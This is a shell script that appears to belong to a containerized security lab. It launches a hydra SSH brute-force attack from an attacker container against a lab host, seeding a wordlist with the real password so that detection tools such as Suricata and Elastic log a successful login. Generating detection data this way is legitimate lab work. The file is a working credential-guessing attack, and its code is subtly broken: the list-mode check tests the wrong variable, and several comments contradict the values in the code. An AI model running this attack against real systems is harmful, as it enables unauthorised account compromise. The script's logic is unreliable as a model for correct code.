#!/bin/sh

set -e

# ./ssh_bruteforce_hydra.sh clab-virtual-env-attacker
# ./ssh_bruteforce_hydra.sh clab-virtual-env-attacker enterprise.com 22 vntd

# If called with -n, return the menu name
if [ "$1" = "-n" ]; then
    echo "SSH Brute Force | hydra"
    exit 0
fi

# Ensure the name of the container is specified
if [ -z "$1" ]; then
    echo "Usage: $0 <attacker-container> [target] [port] [user]"
    echo "[user] == list -> uses a list of the most common usernames"
    exit 1
fi

ATTACKER="$1"
TARGET="${2:-enterprise.com}"             # Default target URL
PORT="${3:-22}"                           # Default to port 80
TARGET_USER="${4:-vntd}"                  # Renamed from USER — USER is a reserved shell variable

# https://www.kali.org/tools/hydra/
echo "================================"
echo "Attack: SSH Brute Force (hydra)"
echo "Target: $TARGET"
echo "Port: $PORT"
echo "User: $TARGET_USER"
echo "================================"

# Write a short wordlist that includes the real password
# This guarantees a successful login event shows up in Suricata/Elastic
docker exec "$ATTACKER" bash -c "cat > /wordlists/ssh_wordlist.txt << 'EOF'
admin
password
123456
root
letmein
qwerty
welcome
pswd
vntd
toor
EOF"

# Passwords
#PASSLIST="/wordlists/10k-most-common.txt"
#PASSLIST="/wordlists/xato-net-10-million-passwords-100000.txt"
PASSLIST="/wordlists/ssh_wordlist.txt"

CUSTOM="/wordlists/ssh_wordlist.txt"

# Append at the end of the file more passwords (the correct password is included [pswd])
# -x           -> exact match
# -q           -> quiet mode
docker exec "$ATTACKER" grep -qx "vntd" "$PASSLIST" || \
docker exec "$ATTACKER" bash -c "cat '$CUSTOM' >> '$PASSLIST'"

# Users
USERLIST="/wordlists/users.txt"

if [ "$USER" = "list" ]; then
    docker exec "$ATTACKER" \
        hydra \
        -L "$USERLIST" \
        -P "$PASSLIST" \
        -s "$PORT" \
        -t 64 \
        -V \
        -f \
        ssh://"$TARGET"
else
    docker exec "$ATTACKER" \
        hydra \
        -l "$TARGET_USER" \
        -P "$PASSLIST" \
        -s "$PORT" \
        -t 64 \
        -V \
        -f \
        ssh://"$TARGET"
fi

# Clean up any remaining hydra child processes
docker exec "$ATTACKER" pkill -9 hydra 2>/dev/null || true